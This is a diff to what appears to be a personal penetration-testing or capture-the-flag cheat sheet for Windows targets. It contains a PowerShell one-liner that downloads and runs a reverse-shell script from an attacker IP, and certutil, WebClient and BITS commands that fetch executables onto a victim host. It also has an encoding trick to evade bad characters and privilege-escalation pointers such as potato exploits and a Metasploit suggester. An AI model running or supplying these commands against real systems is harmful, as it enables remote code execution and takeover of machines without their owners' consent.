@@ -40,11 +40,25 @@ JAWS --> https://github.com/411Hall/JAWS.git
 
 DOWNLOAD SHELL POWERSHELL
 
-IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/reverse.ps1')  (may need to escape quotes)
+cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev2.ps1')  (may need to escape quotes)
 AVOID BAD CHARACTERS --> convert to windows file format
 iconv -t UTF-16LE | base64-w0 
 
+DOWNLOAD FILE CMD/PS
+certutil -urlcache -split -f http://10.10.10.10/agent.exe C:\\users\\public\\agent.exe #CMD
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/1.exe', 'C:/users/merlin/Desktop/1.exe') # PS
+Start-BitsTransfer -Source http://10.10.14.12/jp.exe -Destination jp.exe # PS
+
+
+PRIVESC WINDOWS 
+whoami /priv
+# if SeImpersonatePrivilege is enabled --> juicy/rotten potato
+systeminfo
+metasploit local_exploit_suggester
+
+
 LINUX
+
 
 
 
